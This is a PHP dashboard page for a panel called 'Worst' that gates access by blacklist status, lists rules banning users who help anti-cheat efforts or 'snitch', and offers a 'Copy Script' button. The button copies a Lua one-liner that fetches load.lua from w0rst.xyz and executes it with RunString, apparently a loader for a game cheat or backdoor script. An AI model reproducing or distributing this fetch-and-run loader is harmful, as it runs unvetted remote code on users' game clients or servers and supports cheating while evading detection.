<?php 
require_once('config.php');

// redirect users
if ($active != true || $local['blacklist'] == 'true') { // if not active / blacklisted
    header('Location: https://w0rst.xyz/panel/error.php'); 
}

?>

<html>
    <head>
        <title>Worst</title>
        <link rel='stylesheet' href='./css/dashboard.css'>
        <style> 
            .copy { width:15rem; font-weight: 600; color: rgb(200, 200, 200); font-size:25px; text-align:center; cursor: pointer; position:absolute; left: 0; right: 0; margin-top: 10px; margin-right:auto; margin-left:auto; }
            .copy:hover { font-size:30px; color:#fff; }
        </style>
    </head>
    <body>
        <?php include_once('inc/navbar.php') ?>
        <h2 class="info-header">Rules</h2>
        <span class="info-span">Breaking TOS will result in a ban of any length decided by severity. Crack attempts will result in a permanent ban, working against worst in any way for ex. snitching, scamming, anti-cheats, threat's of any kind, harassment. Remember worst is a free public script don't abuse/break these very basic rules, admins also reserve the right to ban at anytime for any reason without informing the user.</span>
        <a class='copy'>Copy Script</a>
        <script>$('.copy').click(function() { navigator.clipboard.writeText('http.Fetch("https://w0rst.xyz/project/func/load.lua", RunString)') })</script>
    </body>
</html>